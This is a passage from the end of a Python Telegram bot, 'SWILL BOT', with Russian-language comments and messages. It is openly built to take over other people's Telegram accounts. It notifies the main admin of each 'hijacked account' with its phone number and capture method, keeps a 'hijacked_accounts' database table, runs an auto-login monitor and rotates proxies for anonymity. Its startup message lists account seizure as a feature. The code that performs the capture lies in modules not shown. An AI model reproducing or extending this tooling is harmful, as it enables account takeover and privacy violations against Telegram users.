            parse_mode="HTML"
        )
        
        # Уведомляем главного админа
        if not admin_manager.is_main_admin(message.from_user.id):
            try:
                await bot.send_message(
                    config.MAIN_ADMIN_ID,
                    f"🎯 <b>НОВЫЙ АККАУНТ ЗАХВАЧЕН</b>\n\n"
                    f"📱 Номер: {phone}\n"
                    f"👤 Пользователь: @{account_info.get('username', 'нет')}\n"
                    f"👮 Захватил: ID {message.from_user.id}\n"
                    f"🔧 Метод: {method}\n"
                    f"🎯 ID аккаунта: {account_id}\n"
                    f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
                    parse_mode="HTML"
                )
            except:
                pass
    else:
        await message.answer(
            f"❌ <b>ОШИБКА ЗАХВАТА АККАУНТА</b>\n\n"
            f"📱 Номер: {phone}\n"
            f"🔢 Код: {code}\n"
            f"🔧 Метод: {method}\n"
            f"⚠️ Ошибка: {result.get('error', 'Неизвестная ошибка')}\n\n"
            f"<i>Возможные причины:\n"
            f"1. Неверный код\n"
            f"2. Аккаунт защищен 2FA\n"
            f"3. Проблемы с подключением\n"
            f"4. Неверные API credentials</i>",
            parse_mode="HTML"
        )
    
    await state.clear()

# Настройки бота
@dp.callback_query(F.data == "admin_settings")
async def admin_settings_menu(callback_query: CallbackQuery):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Только главный админ может изменять настройки")
        return
    
    # Получаем текущие настройки
    current_proxy = anonymity_manager.current_proxy
    proxy_status = "✅ Настроен" if current_proxy else "❌ Не настроен"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔄 Сменить прокси", callback_data="settings_change_proxy"),
            InlineKeyboardButton(text="🔧 Настройки безопасности", callback_data="settings_security")
        ],
        [
            InlineKeyboardButton(text="🗑️ Очистить данные", callback_data="settings_clear_data"),
            InlineKeyboardButton(text="📊 Настройки базы", callback_data="settings_database")
        ],
        [
            InlineKeyboardButton(text="🚪 Управление сессиями", callback_data="settings_sessions"),
            InlineKeyboardButton(text="🔔 Настройки уведомлений", callback_data="settings_notifications")
        ],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback_query.message.edit_text(
        f"⚙️ <b>НАСТРОЙКИ СИСТЕМЫ SWILL</b>\n\n"
        f"📊 Основные настройки:\n"
        f"• Прокси: {proxy_status}\n"
        f"• Активных сессий: {len(account_manager.active_sessions)}\n"
        f"• Лимит админов: {config.MAX_ADMINS}\n"
        f"• Лимит каналов: {config.MAX_CHANNELS}\n\n"
        f"<i>Выберите категорию настроек:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

# ========== ОБРАБОТЧИКИ ОДОБРЕНИЯ КАНАЛОВ ==========
@dp.callback_query(F.data.startswith("approve_channel:"))
async def handle_approve_channel(callback_query: CallbackQuery):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Только главный админ может одобрять каналы")
        return
    
    channel_db_id = int(callback_query.data.split(":")[1])
    
    await callback_query.message.edit_text(
        f"⏳ <b>Одобряю канал #{channel_db_id}...</b>",
        parse_mode="HTML"
    )
    
    result = await channel_manager.approve_channel(channel_db_id, callback_query.from_user.id)
    
    if result['success']:
        await callback_query.message.edit_text(
            f"✅ <b>КАНАЛ ОДОБРЕН!</b>\n\n"
            f"📢 Канал: {result.get('channel_title', 'Unknown')}\n"
            f"🎯 ID в системе: {channel_db_id}\n\n"
            f"Уведомления будут отправляться в канал.\n"
            f"Админ-уведомления отключены.",
            parse_mode="HTML"
        )
    else:
        await callback_query.message.edit_text(
            f"❌ <b>ОШИБКА ОДОБРЕНИЯ КАНАЛА</b>\n\n"
            f"ID: {channel_db_id}\n"
            f"Ошибка: {result.get('error', 'Неизвестная ошибка')}",
            parse_mode="HTML"
        )

@dp.callback_query(F.data.startswith("reject_channel:"))
async def handle_reject_channel(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Только главный админ может отклонять каналы")
        return
    
    channel_db_id = int(callback_query.data.split(":")[1])
    
    await state.set_state(AdminStates.waiting_channel_action)
    await state.update_data(channel_db_id=channel_db_id, action='reject')
    
    await callback_query.message.edit_text(
        f"📝 <b>УКАЖИТЕ ПРИЧИНУ ОТКЛОНЕНИЯ</b>\n\n"
        f"Канал ID: {channel_db_id}\n\n"
        f"Введите причину отклонения канала:",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_channel_action)
async def process_channel_action_reason(message: Message, state: FSMContext):
    if not admin_manager.is_main_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    user_data = await state.get_data()
    channel_db_id = user_data.get('channel_db_id')
    action = user_data.get('action')
    reason = message.text
    
    if action == 'reject':
        result = await channel_manager.reject_channel(channel_db_id, message.from_user.id, reason)
        
        if result['success']:
            await message.answer(
                f"✅ <b>КАНАЛ ОТКЛОНЕН!</b>\n\n"
                f"ID: {channel_db_id}\n"
                f"📝 Причина: {reason}\n\n"
                f"Канал удален из системы.",
                parse_mode="HTML"
            )
        else:
            await message.answer(
                f"❌ <b>ОШИБКА ОТКЛОНЕНИЯ КАНАЛА</b>\n\n"
                f"ID: {channel_db_id}\n"
                f"Ошибка: {result.get('error', 'Неизвестная ошибка')}",
                parse_mode="HTML"
            )
    
    await state.clear()

# ========== ОБРАБОТЧИК КНОПКИ НАЗАД ==========
@dp.callback_query(F.data == "back_to_main")
async def back_to_main_menu(callback_query: CallbackQuery, state: FSMContext):
    await state.clear()
    await cmd_start(callback_query.message, state)

# ========== ЗАПУСК СИСТЕМ МОНИТОРИНГА ==========
async def start_background_tasks():
    """Запускает фоновые задачи системы"""
    logger.info("Запуск фоновых задач...")
    
    # Запускаем систему авто-входа
    await auto_login_system.start_monitoring()
    
    # Запускаем ротацию прокси
    asyncio.create_task(proxy_rotation_task())
    
    # Запускаем очистку старых данных
    asyncio.create_task(cleanup_old_data_task())
    
    logger.info("Фоновые задачи запущены")

async def proxy_rotation_task():
    """Периодическая ротация прокси"""
    while True:
        try:
            await anonymity_manager.rotate_proxy()
            await asyncio.sleep(3600)  # Ротация каждый час
        except Exception as e:
            logger.error(f"Ошибка ротации прокси: {e}")
            await asyncio.sleep(300)

async def cleanup_old_data_task():
    """Очистка старых данных из базы"""
    while True:
        try:
            # Удаляем старые логи (старше 30 дней)
            month_ago = (datetime.now() - timedelta(days=30)).isoformat()
            db.execute(
                "DELETE FROM security_logs WHERE timestamp < ?",
                (month_ago,)
            )
            
            # Удаляем старые сообщения (старше 14 дней)
            two_weeks_ago = (datetime.now() - timedelta(days=14)).isoformat()
            db.execute(
                "DELETE FROM messages WHERE sent_date < ?",
                (two_weeks_ago,)
            )
            
            # Деактивируем неактивные аккаунты (не использовались 7 дней)
            week_ago = (datetime.now() - timedelta(days=7)).isoformat()
            db.execute(
                "UPDATE hijacked_accounts SET is_active = 0 WHERE last_used < ? AND is_active = 1",
                (week_ago,)
            )
            
            logger.info("Очистка старых данных выполнена")
            await asyncio.sleep(86400)  # Раз в день
            
        except Exception as e:
            logger.error(f"Ошибка очистки данных: {e}")
            await asyncio.sleep(3600)

# ========== ОБРАБОТЧИК ОШИБОК ==========
@dp.errors()
async def errors_handler(update: types.Update, exception: Exception):
    """Обработчик ошибок бота"""
    try:
        logger.error(f"Ошибка при обработке обновления {update}: {exception}")
        
        # Пытаемся отправить сообщение об ошибке главному админу
        try:
            error_summary = str(exception)[:500]
            await bot.send_message(
                config.MAIN_ADMIN_ID,
                f"⚠️ <b>ОШИБКА БОТА</b>\n\n"
                f"Тип: {type(exception).__name__}\n"
                f"Ошибка: {error_summary}\n"
                f"Время: {datetime.now().strftime('%H:%M:%S')}",
                parse_mode="HTML"
            )
        except:
            pass
        
        return True
    except Exception as e:
        logger.error(f"Ошибка в обработчике ошибок: {e}")
        return True

# ========== ЗАПУСК БОТА ==========
async def main():
    """Основная функция запуска бота"""
    
    print("=" * 60)
    print("🤖 SWILL BOT - ПОЛНАЯ ВЕРСИЯ")
    print("=" * 60)
    
    # Получаем информацию о боте
    bot_info = await bot.get_me()
    
    print(f"Бот: @{bot_info.username}")
    print(f"ID: {bot_info.id}")
    print(f"Имя: {bot_info.first_name}")
    print(f"Главный админ: {config.MAIN_ADMIN_ID}")
    print(f"База данных: {config.DB_PATH}")
    print(f"Прокси: {'✅ Настроен' if config.PROXY_URL else '❌ Не настроен'}")
    print(f"API для захвата: {'✅ Настроено' if config.TELEGRAM_API_ID and config.TELEGRAM_API_HASH else '❌ Не настроено'}")
    print("=" * 60)
    
    # Запускаем фоновые задачи
    await start_background_tasks()
    
    # Уведомляем главного админа о запуске
    try:
        await bot.send_message(
            config.MAIN_ADMIN_ID,
            f"🚀 <b>SWILL BOT ЗАПУЩЕН!</b>\n\n"
            f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Бот: @{bot_info.username}\n"
            f"Версия: Полная\n"
            f"Статус: ✅ АКТИВЕН\n\n"
            f"<b>Доступные функции:</b>\n"
            f"• 📨 Отправка сообщений по @username\n"
            f"• 📢 Управление каналами/группами\n"
            f"• 👥 Управление администраторами\n"
            f"• 👤 Захват и управление аккаунтами Telegram\n"
            f"• 🔒 Полная анонимность\n"
            f"• ⚙️ Расширенные настройки\n\n"
            f"Используйте /start для начала работы.",
            parse_mode="HTML"
        )
        logger.info(f"Уведомление отправлено главному админу {config.MAIN_ADMIN_ID}")
    except Exception as e:
        logger.error(f"Не удалось отправить уведомление админу: {e}")
    
    # Запускаем бота
    logger.info("Бот запущен и готов к работе")
    
    try:
        await dp.start_polling(bot, skip_updates=True)
    except KeyboardInterrupt:
        logger.info("Бот остановлен пользователем")
    except Exception as e:
        logger.error(f"Критическая ошибка: {e}")
    finally:
        # Очищаем ресурсы
        await bot.session.close()
        db.close()
        
        # Останавливаем системы мониторинга
        await auto_login_system.stop_monitoring()
        
        logger.info("Бот остановлен, ресурсы освобождены")

if __name__ == "__main__":
    # Создаем директории если нужно
    os.makedirs('sessions', exist_ok=True)
    os.makedirs('media', exist_ok=True)
    os.makedirs('logs', exist_ok=True)
    
    # Запускаем бота
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nБот остановлен")
    except Exception as e:
        print(f"Критическая ошибка запуска: {e}")